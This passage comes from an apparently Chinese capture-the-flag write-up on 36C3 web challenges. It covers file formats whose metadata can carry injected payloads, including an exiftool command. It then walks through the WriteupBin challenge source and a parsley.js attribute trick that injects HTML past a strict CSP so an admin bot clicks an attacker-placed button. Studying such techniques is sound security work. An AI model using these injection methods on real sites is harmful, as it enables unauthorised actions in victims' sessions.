wp&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x53D1;&#x73B0;&#x8FD8;&#x5B58;&#x5728;&#x7740;&#x8FD9;&#x4E48;&#x4E00;&#x4E9B;&#x6587;&#x4EF6;&#x53EF;&#x4EE5;&#x7528;&#x6765;&#x6CE8;&#x5165;&#x3002;</p><h4 id="TeX-DVI-file"><a href="#TeX-DVI-file" class="headerlink" title="TeX DVI file"></a>TeX DVI file</h4><p>0xf702 &#x6587;&#x4EF6;&#x5934;&#xFF0C;&#x5728;&#x586B;&#x5145;&#x4E00;&#x5B9A;&#x6570;&#x636E;&#x540E;&#x6709;&#x6211;&#x4EEC;&#x5B8C;&#x5168;&#x53EF;&#x63A7;&#x7684;&#x6570;&#x636E;</p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200106141314.png" alt></p><h4 id="jpeg"><a href="#jpeg" class="headerlink" title="jpeg"></a>jpeg</h4><p>&#x5728; jpeg &#x7684; EXIF &#x6570;&#x636E;&#x6BB5;&#x4E2D;&#x6709;&#x7528;&#x6765;&#x6807;&#x8BC6; software &#x7684;&#x6570;&#x636E;&#x4E5F;&#x662F;&#x6211;&#x4EEC;&#x53EF;&#x63A7;&#x7684;&#x5730;&#x65B9;&#xFF0C;&#x540C;&#x6837;&#x7528;&#x6765;&#x6807;&#x8BC6; comment &#x7684;&#x5730;&#x65B9;&#x6211;&#x4EEC;&#x4E5F;&#x53EF;&#x63A7;&#x3002;&#x4E8E;&#x662F;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x4F7F;&#x7528; exiftool &#x6765;&#x4FEE;&#x6539;&#x56FE;&#x7247;&#x3002;</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exiftool -overwrite_original -comment=<span class="hljs-string">&quot;payload&quot;</span> -software=<span class="hljs-string">&quot;payload2&quot;</span> 1.jpg</span><br></pre></td></tr></table></figure><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200106142658.png" alt></p><h4 id><a href="#" class="headerlink" title="#!"></a>#!</h4><p>&#x6211;&#x4EEC;&#x8FD8;&#x53EF;&#x4EE5;&#x5229;&#x7528;<code>#!/</code>&#x7684;&#x6587;&#x4EF6;&#x6765;&#x6784;&#x9020; payload</p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200106143105.png" alt></p><h4 id="gz"><a href="#gz" class="headerlink" title="gz"></a>gz</h4><p>&#x5229;&#x7528;<code>gunzip</code>&#x751F;&#x6210;&#x7684; gz &#x6587;&#x4EF6;&#xFF0C;&#x6211;&#x4EEC;&#x4E5F;&#x53EF;&#x4EE5;&#x7528;&#x6765;&#x6CE8;&#x5165;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x63A7;&#x7684;&#x6570;&#x636E;&#x662F;&#x5B83;&#x7684;&#x6587;&#x4EF6;&#x540D;</p><p><img src="https://posts.xh4h.com/assets/images/36c3/gunzip1.png" alt></p><p>&#x5F53;&#x7136;&#x6211;&#x4EEC;&#x4E5F;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x4FEE;&#x6539; gz &#x6587;&#x4EF6;&#x5185;&#x5BB9;</p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200106143647.png" alt></p><h2 id="WriteUpBin"><a href="#WriteUpBin" class="headerlink" title="WriteUpBin"></a>WriteUpBin</h2><blockquote><p><strong>Difficulty estimate</strong>: medium</p><p><strong>Solved</strong>:13/321</p><p><strong>Points</strong>: round(1000 &#xB7; min(1, 10 / (9 + [13 solves]))) = <strong>455</strong> points</p><p><strong>Description:</strong></p><p>Finally (again), a minimalistic, open-source social writeup hosting solution.</p><p><strong>Download:</strong></p><p><a href="https://github.com/ZeddYu/36c3-CTF-Web/blob/master/writeupbin/WriteupBin-10b65573b511269f.tar.xz" target="_blank" rel="noopener">WriteupBin-10b65573b511269f.tar.xz</a></p></blockquote><p>&#x4E00;&#x9053;&#x6BD4;&#x8F83;&#x6709;&#x610F;&#x601D;&#x7684;&#x4FA7;&#x4FE1;&#x9053;&#x9898;&#x76EE;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x6240;&#x7ED9;&#x9644;&#x4EF6;&#x642D;&#x5EFA;&#x5F62;&#x5F0F;&#x77E5;&#x9053;&#xFF0C;flag &#x5B58;&#x653E;&#x5728;&#x6570;&#x636E;&#x5E93;&#x5F53;&#x4E2D;&#xFF0C;&#x5E76;&#x4E14;&#x662F;&#x5728; admin &#x7528;&#x6237;&#x7684;&#x7B2C;&#x4E00;&#x6761; writeup &#x6570;&#x636E;&#x7684;&#x5185;&#x5BB9;&#x5F53;&#x4E2D;&#xFF0C;&#x9898;&#x76EE;&#x63D0;&#x4F9B;&#x7B80;&#x5355;&#x7684;&#x4E0A;&#x4F20;&#x6587;&#x672C;&#x7684;&#x529F;&#x80FD;&#xFF0C;&#x5E76;&#x4E14;&#x53EF;&#x4EE5;&#x63D0;&#x4EA4;&#x7ED9; admin &#xFF0C;&#x8BA9; admin &#x7ED9;&#x4F60;&#x70B9;&#x8D5E;&#x3002;</p><p>&#x9879;&#x76EE;&#x7ED3;&#x6784;&#x5982;&#x4E0B;&#xFF1A;</p><figure class="highlight stylus hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">&#x251C;&#x2500;&#x2500; Dockerfile<span class="hljs-comment">//Docker&#x6587;&#x4EF6;</span></span><br><span class="line">&#x251C;&#x2500;&#x2500; admin<span class="hljs-selector-class">.py</span><span class="hljs-comment">//&#x4F7F;&#x7528;selenium&#x6A21;&#x62DF;admin&#x767B;&#x5F55;&#x5E76;&#x70B9;&#x8D5E;</span></span><br><span class="line">&#x251C;&#x2500;&#x2500; db<span class="hljs-selector-class">.sql</span><span class="hljs-comment">//&#x6570;&#x636E;&#x5E93;&#x6587;&#x4EF6;</span></span><br><span class="line">&#x251C;&#x2500;&#x2500; docker-stuff</span><br><span class="line">&#x2502;&#xA0;&#xA0; &#x251C;&#x2500;&#x2500; default<span class="hljs-comment">//&#x914D;&#x7F6E;&#x6587;&#x4EF6;</span></span><br><span class="line">&#x2502;&#xA0;&#xA0; &#x2514;&#x2500;&#x2500; www<span class="hljs-selector-class">.conf</span><span class="hljs-comment">//&#x914D;&#x7F6E;&#x6587;&#x4EF6;</span></span><br><span class="line">&#x251C;&#x2500;&#x2500; www</span><br><span class="line">&#x2502;&#xA0;&#xA0; &#x251C;&#x2500;&#x2500; general<span class="hljs-selector-class">.php</span><span class="hljs-comment">//&#x8FDE;&#x63A5;&#x6570;&#x636E;&#x5E93;&#x8BBE;&#x7F6E;header&#x5934;&#x7B49;&#x4E00;&#x4E9B;&#x521D;&#x59CB;&#x5316;&#x64CD;&#x4F5C;</span></span><br><span class="line">&#x2502;&#xA0;&#xA0; &#x251C;&#x2500;&#x2500; html</span><br><span class="line">&#x2502;&#xA0;&#xA0; &#x2502;&#xA0;&#xA0; &#x251C;&#x2500;&#x2500; add<span class="hljs-selector-class">.php</span><span class="hljs-comment">//&#x6DFB;&#x52A0;writeup&#x76F8;&#x5173;&#x64CD;&#x4F5C;</span></span><br><span class="line">&#x2502;&#xA0;&#xA0; &#x2502;&#xA0;&#xA0; &#x251C;&#x2500;&#x2500; admin<span class="hljs-selector-class">.php</span><span class="hljs-comment">//&#x628A;writeup&#x63D0;&#x4EA4;&#x7ED9;admin</span></span><br><span class="line">&#x2502;&#xA0;&#xA0; &#x2502;&#xA0;&#xA0; &#x251C;&#x2500;&#x2500; index<span class="hljs-selector-class">.php</span><span class="hljs-comment">//&#x5165;&#x53E3;&#x6587;&#x4EF6;</span></span><br><span class="line">&#x2502;&#xA0;&#xA0; &#x2502;&#xA0;&#xA0; &#x251C;&#x2500;&#x2500; like<span class="hljs-selector-class">.php</span><span class="hljs-comment">//&#x70B9;&#x8D5E;&#x64CD;&#x4F5C;</span></span><br><span class="line">&#x2502;&#xA0;&#xA0; &#x2502;&#xA0;&#xA0; &#x251C;&#x2500;&#x2500; login_admin<span class="hljs-selector-class">.php</span><span class="hljs-comment">//admin&#x767B;&#x9646;&#x64CD;&#x4F5C;</span></span><br><span class="line">&#x2502;&#xA0;&#xA0; &#x2502;&#xA0;&#xA0; &#x2514;&#x2500;&#x2500; show<span class="hljs-selector-class">.php</span><span class="hljs-comment">//&#x83B7;&#x53D6;writeup&#x5185;&#x5BB9;</span></span><br><span class="line">&#x2502;&#xA0;&#xA0; &#x2514;&#x2500;&#x2500; views</span><br><span class="line">&#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; <span class="hljs-selector-tag">header</span><span class="hljs-selector-class">.php</span><span class="hljs-comment">//&#x5728;&#x9875;&#x9762;&#x4E0A;&#x65B9;&#x5C55;&#x793A;&#x76EE;&#x524D;id&#x63D0;&#x4EA4;&#x7684;writeup</span></span><br><span class="line">&#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; home<span class="hljs-selector-class">.php</span><span class="hljs-comment">//&#x9875;&#x9762;&#x4E2D;&#x90E8;&#x7528;&#x6765;&#x63D0;&#x4F9B;&#x7ED9;&#x7528;&#x6237;&#x8F93;&#x5165;&#x7684;&#x754C;&#x9762;</span></span><br><span class="line">&#x2502;&#xA0;&#xA0;     &#x2514;&#x2500;&#x2500; show<span class="hljs-selector-class">.php</span><span class="hljs-comment">//&#x70B9;&#x8D5E;&#x3001;&#x63D0;&#x4EA4;&#x7ED9;admin&#x7684;&#x5C55;&#x793A;&#x9875;&#x9762;</span></span><br><span class="line">&#x2514;&#x2500;&#x2500; ynetd<span class="hljs-comment">//&#x7528;&#x6765;&#x542F;&#x52A8; admin.py</span></span><br></pre></td></tr></table></figure><p>&#x65E2;&#x7136; flag &#x5728;&#x6570;&#x636E;&#x5E93;&#x5F53;&#x4E2D;&#xFF0C;&#x90A3;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x9996;&#x5148;&#x6765;&#x770B;&#x770B; show.php &#xFF0C;&#x56E0;&#x4E3A;&#x8FD9;&#x4E2A;&#x6587;&#x4EF6;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x7528;&#x6765;&#x83B7;&#x53D6; writeup &#x7684;&#x5185;&#x5BB9;&#x3002;</p><figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"><span class="hljs-keyword">include_once</span> <span class="hljs-string">&apos;../general.php&apos;</span>;</span><br><span class="line"></span><br><span class="line">$stmt = $db-&gt;prepare(<span class="hljs-string">&apos;SELECT id, content FROM `writeup` WHERE `id` = ?&apos;</span>);</span><br><span class="line">$stmt-&gt;bind_param(<span class="hljs-string">&apos;s&apos;</span>, $_GET[<span class="hljs-string">&apos;id&apos;</span>]);</span><br><span class="line">$stmt-&gt;execute();</span><br><span class="line">$writeup = mysqli_fetch_all($stmt-&gt;get_result(), MYSQLI_ASSOC)[<span class="hljs-number">0</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$stmt = $db-&gt;prepare(<span class="hljs-string">&apos;SELECT user_id FROM `like` WHERE `writeup_id` = ?&apos;</span>);</span><br><span class="line">$stmt-&gt;bind_param(<span class="hljs-string">&apos;s&apos;</span>, $_GET[<span class="hljs-string">&apos;id&apos;</span>]);</span><br><span class="line">$stmt-&gt;execute();</span><br><span class="line">$result = $stmt-&gt;get_result();</span><br><span class="line">$likes = mysqli_fetch_all($result, MYSQLI_ASSOC);</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">include</span>(<span class="hljs-string">&apos;../views/header.php&apos;</span>);</span><br><span class="line"><span class="hljs-keyword">include</span>(<span class="hljs-string">&apos;../views/show.php&apos;</span>);</span><br></pre></td></tr></table></figure><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x770B;&#x5230; id &#x5E76;&#x6CA1;&#x6709;&#x4EC0;&#x4E48;&#x9274;&#x6743;&#x63AA;&#x65BD;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7; writeup id &#x6765;&#x83B7;&#x53D6; writeup &#x5185;&#x5BB9;&#xFF0C;&#x800C; flag writeup id &#x5728; admin &#x7528;&#x6237;&#x6570;&#x636E;&#x5F53;&#x4E2D;&#xFF0C;&#x800C;&#x5728; header.php &#x4E2D;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x5F53;&#x524D;&#x7528;&#x6237;&#x6240;&#x6709;&#x7684; writeup id</p><figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">foreach</span>($writeups <span class="hljs-keyword">as</span> $w): <span class="hljs-meta">?&gt;</span></span><br><span class="line">  &lt;li&gt;&lt;a href=<span class="hljs-string">&quot;/show.php?id=&lt;?= $w[&apos;id&apos;] ?&gt;&quot;</span>&gt;Writeup - <span class="hljs-meta">&lt;?</span>= $w[<span class="hljs-string">&apos;id&apos;</span>] <span class="hljs-meta">?&gt;</span>&lt;/a&gt;&lt;/li&gt;</span><br><span class="line"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">endforeach</span>; <span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>&#x65E2;&#x7136;&#x6709;&#x63D0;&#x4EA4;&#x4EE3;&#x7801;&#x7ED9; admin &#x7684;&#x529F;&#x80FD;&#xFF0C;&#x90A3;&#x4E48;&#x662F;&#x4E0D;&#x662F;&#x6709;&#x53EF;&#x80FD;&#x662F;&#x4E00;&#x4E2A; xss &#x6216;&#x8005;&#x4EC0;&#x4E48;&#x7684;&#xFF1F;</p><p>&#x6211;&#x4EEC;&#x8FD8;&#x53EF;&#x4EE5;&#x770B;&#x5230; admin &#x518D;&#x6536;&#x5230; writeup &#x540E;&#x7684;&#x4E3B;&#x8981;&#x64CD;&#x4F5C;&#xFF1A;</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">display = Display(visible=<span class="hljs-number">0</span>, size=(<span class="hljs-number">800</span>, <span class="hljs-number">600</span>))</span><br><span class="line">display.start()</span><br><span class="line">chrome_options = Options()</span><br><span class="line">chrome_options.add_argument(<span class="hljs-string">&apos;--disable-gpu&apos;</span>)</span><br><span class="line">chrome_options.add_argument(<span class="hljs-string">&apos;--headless&apos;</span>)</span><br><span class="line">chrome_options.add_argument(<span class="hljs-string">&apos;--no-sandbox&apos;</span>)</span><br><span class="line">driver = webdriver.Chrome(<span class="hljs-string">&apos;/usr/bin/chromedriver&apos;</span>, options=chrome_options)</span><br><span class="line"></span><br><span class="line">url = <span class="hljs-string">&apos;http://admin:__ADMIN_TOKEN__@127.0.0.1/login_admin.php?id=&apos;</span>+writeup_id</span><br><span class="line">driver.get(url)</span><br><span class="line">element = driver.find_element_by_xpath(<span class="hljs-string">&apos;//input[@id=&quot;like&quot;]&apos;</span>)</span><br><span class="line">element.click()</span><br><span class="line"></span><br><span class="line">driver.quit()</span><br><span class="line">display.stop()</span><br></pre></td></tr></table></figure><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x770B;&#x5230; admin &#x5728;&#x8FDB;&#x884C;&#x767B;&#x5F55;&#x4E4B;&#x540E;&#x4F7F;&#x7528;<code>find_element_by_xpath</code>&#x627E;&#x5230;&#x4E86; id &#x4E3A; like &#x7684; input &#x6807;&#x7B7E;&#xFF0C;&#x5E76;&#x8FDB;&#x884C;&#x4E86;&#x70B9;&#x51FB;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x63D0;&#x4EA4;&#x7ED9; admin &#x7684; writeup &#x540E;&#xFF0C;admin &#x4F1A;&#x6D4F;&#x89C8;&#x8FDB;&#x884C;&#x70B9;&#x51FB;&#xFF0C;&#x53D1;&#x9001;&#x4E00;&#x4E2A;&#x70B9;&#x8D5E;&#x8BF7;&#x6C42;</p><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;/like.php&quot;</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;c&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&lt;?= $_SESSION[&apos;c&apos;] ?&gt;&quot;</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;id&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&lt;?= $writeup[&apos;id&apos;] ?&gt;&quot;</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;like&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&#x1F44D;&quot;</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>&#x63A5;&#x7740;&#x6211;&#x4EEC;&#x6765;&#x770B;&#x770B; general.php &#x4E2D;&#x7684;&#x9632;&#x5FA1;&#x63AA;&#x65BD;</p><figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">session_start([<span class="hljs-string">&apos;cookie_httponly&apos;</span> =&gt; <span class="hljs-keyword">true</span>, <span class="hljs-string">&apos;cookie_samesite&apos;</span> =&gt; <span class="hljs-string">&apos;Strict&apos;</span>]);</span><br><span class="line"><span class="hljs-comment">//...</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">id</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">return</span> bin2hex(random_bytes(<span class="hljs-number">8</span>));</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">$nonce = base64_encode(id());</span><br><span class="line"><span class="hljs-comment">//...</span></span><br><span class="line">header(<span class="hljs-string">&apos;x-xss-protection: 1; mode=block&apos;</span>);</span><br><span class="line">header(<span class="hljs-string">&apos;X-Content-Type-Options: nosniff&apos;</span>);</span><br><span class="line">header(<span class="hljs-string">&apos;x-frame-options: DENY&apos;</span>);</span><br><span class="line">header(<span class="hljs-string">&apos;Referrer-Policy: no-referrer&apos;</span>);</span><br><span class="line">header(<span class="hljs-string">&quot;Feature-Policy: geolocation &apos;none&apos;; midi &apos;none&apos;; sync-xhr &apos;none&apos;; microphone &apos;none&apos;; camera &apos;none&apos;; magnetometer &apos;none&apos;; gyroscope &apos;none&apos;; speaker &apos;none&apos;; fullscreen &apos;none&apos;; payment &apos;none&apos;; usb &apos;none&apos;; vr &apos;none&apos;; encrypted-media &apos;none&apos;&quot;</span>);</span><br><span class="line">header(<span class="hljs-string">&quot;Content-Security-Policy: default-src &apos;none&apos;; script-src &apos;nonce-&quot;</span>.$nonce.<span class="hljs-string">&quot;&apos; https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.0/jquery.min.js https://cdnjs.cloudflare.com/ajax/libs/parsley.js/2.8.2/parsley.min.js; base-uri &apos;self&apos;; form-action &apos;self&apos;; frame-ancestors &apos;none&apos;; require-sri-for script style;&quot;</span>);</span><br></pre></td></tr></table></figure><p>&#x800C;<code>script-src</code>&#x8BBE;&#x7F6E;&#x7684; nonce &#x53EA;&#x5728; header.php &#x4F7F;&#x7528;&#x4E86;&#xFF0C;&#x800C;&#x4E14;&#x6211;&#x4EEC;&#x4E5F;&#x62FF;&#x4E0D;&#x5230;&#x8FD9;&#x4E2A; nonce</p><figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script nonce=<span class="hljs-string">&quot;&lt;?=$nonce?&gt;&quot;</span>&gt;</span><br><span class="line">    $(<span class="hljs-string">&apos;#publish-form&apos;</span>).parsley() <span class="hljs-comment">// prevent hacking</span></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x53EF;&#x80FD;&#x9700;&#x8981;&#x5F80;&#x70B9;&#x51FB;&#x4E8B;&#x4EF6;&#x90A3;&#x4E00;&#x65B9;&#x9762;&#x601D;&#x8003;&#xFF0C;&#x5E76;&#x4E14;&#x5229;&#x7528;&#x9898;&#x76EE;&#x5F15;&#x5165;&#x7684;&#x4E24;&#x4E2A; js &#x6587;&#x4EF6;&#x5165;&#x624B;&#xFF0C;&#x4E00;&#x4E2A; jquery.js &#xFF0C;&#x53E6;&#x4E00;&#x4E2A; parsley.js&#x3002;</p><h3 id="Parsley-js"><a href="#Parsley-js" class="headerlink" title="Parsley.js"></a>Parsley.js</h3><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x53BB; <a href="https://parsleyjs.org/doc/index.html" target="_blank" rel="noopener">parsley.js doc</a> &#x770B;&#x5230;&#x8BE5; lib &#x7684;&#x7B80;&#x5355;&#x8BF4;&#x660E;&#x4EE5;&#x53CA;&#x4F7F;&#x7528;&#xFF1A;</p><blockquote><p>Parsley is a javascript form validation library. It helps you provide your users with feedback on their form submission before sending it to your server. It saves you bandwidth, server load and it saves time for your users.</p><p>Javascript form validation is not necessary, and if used, it <strong>does not replace strong backend server validation.</strong></p><p>That&#x2019;s why Parsley is here: to let you define your general form validation, implement it on the backend side, and simply port it frontend-side, with maximum respect to user experience best practices.</p></blockquote><p>&#x53EF;&#x4EE5;&#x770B;&#x51FA;&#x8FD9;&#x662F;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x524D;&#x7AEF;&#x9A8C;&#x8BC1;&#x5E93;&#xFF0C;&#x7B80;&#x5355;&#x67E5;&#x4E00;&#x4E0B;&#x6587;&#x6863;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x53D1;&#x73B0;&#x6709;&#x51E0;&#x4E2A;&#x6709;&#x610F;&#x601D;&#x7684; API&#xFF1A;</p><blockquote><p><strong>data-parsley-trigger=&#x201D;input&#x201D;</strong></p><p>Specify one or many javascript events that will trigger item validation, before any failure. To set multiple events, separate them with a space data-parsley-trigger=&#x201D;focusin focusout&#x201D;. Default is null. See the various events supported by jQuery.</p><p><strong>data-parsley-error-message=&#x201D;my message&#x201D;</strong></p><p>Customize a unique global message for the field.</p><p><strong>data-parsley-errors-container=&#x201D;#element&#x201D;</strong></p><p>Specify the existing DOM container where ParsleyUI should put the errors. It is also possible to configure it with a callback function from javascript, see the annotated source.</p></blockquote><p>&#x6839;&#x636E;&#x6587;&#x6863;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5229;&#x7528;<code>data-parsley-trigger</code>&#x8BBE;&#x7F6E;&#x6211;&#x4EEC;&#x7684;&#x89E6;&#x53D1;&#x65B9;&#x5F0F;&#xFF0C;&#x4F7F;&#x7528;<code>data-parsley-error-message</code>&#x6765;&#x81EA;&#x5B9A;&#x4E49;&#x6211;&#x4EEC;&#x7684;&#x9519;&#x8BEF;&#x4FE1;&#x606F;&#xFF0C;&#x4F7F;&#x7528;<code>data-parsley-errors-container</code>&#x6765;&#x81EA;&#x5B9A;&#x4E49;&#x6211;&#x4EEC;&#x7684;&#x663E;&#x793A;&#x9519;&#x8BEF;&#x7684;&#x4F4D;&#x7F6E;&#x3002;</p><p>&#x6839;&#x636E;&#x6587;&#x6863;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x7B80;&#x5355;&#x7528;&#x4E00;&#x4E2A;<code>data-parsley-validate</code>&#x6307;&#x5B9A;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x9A8C;&#x8BC1;&#x7684;&#x8868;&#x5355;&#xFF0C;&#x7136;&#x540E;&#x5229;&#x7528;&#x9519;&#x8BEF;&#x4FE1;&#x606F;&#x628A;&#x5143;&#x7D20;&#x6807;&#x7B7E;&#x8F93;&#x51FA;&#x51FA;&#x6765;&#xFF0C;&#x5E76;&#x4E14;&#x6211;&#x4EEC;&#x63A5;&#x7740;&#x8FD8;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x6307;&#x5B9A;&#x8F93;&#x51FA;&#x4F4D;&#x7F6E;&#x6765;&#x63A7;&#x5236;&#x8F93;&#x51FA;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">data-parsley-validate</span>&gt;</span></span><br><span class="line">        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> </span></span><br><span class="line"><span class="hljs-tag">            <span class="hljs-attr">data-parsley-trigger</span>=<span class="hljs-string">&quot;blur&quot;</span> <span class="hljs-attr">autofocus</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;some-field&quot;</span></span></span><br><span class="line"><span class="hljs-tag">            <span class="hljs-attr">data-parsley-error-message</span>=<span class="hljs-string">&quot;&lt;input id=like type=button value=padyload&gt;&quot;</span> </span></span><br><span class="line"><span class="hljs-tag">            <span class="hljs-attr">data-parsley-required</span></span></span><br><span class="line"><span class="hljs-tag">            <span class="hljs-attr">data-parsley-errors-container</span>=<span class="hljs-string">&quot;#div1&quot;</span>/&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>data-parsley-trigger</code>&#x6307;&#x5B9A;&#x4E86;<code>blur</code>&#x4E8B;&#x4EF6;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x5F53;&#x6211;&#x4EEC;&#x7684; input &#x5931;&#x7126;&#x65F6;&#xFF0C;&#x4F1A;&#x663E;&#x793A;&#x6211;&#x4EEC;&#x7684;&#x9519;&#x8BEF;&#x4FE1;&#x606F;&#xFF0C;&#x5E76;&#x4E14;&#x5728; id &#x4E3A; div1 &#x7684;&#x5143;&#x7D20;&#x4E2D;&#x663E;&#x793A;&#xFF0C;&#x66F4;&#x91CD;&#x8981;&#x7684;&#x662F;&#xFF0C;&#x6D4F;&#x89C8;&#x5668;&#x4E5F;&#x5C06;&#x5176;&#x8FDB;&#x884C;&#x4E86;&#x6E32;&#x67D3;&#x3002;</p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200108013312.png" alt></p><p>###Click</p><p>&#x56DE;&#x5230;&#x9898;&#x76EE;&#x5F53;&#x4E2D;&#xFF0C;admin 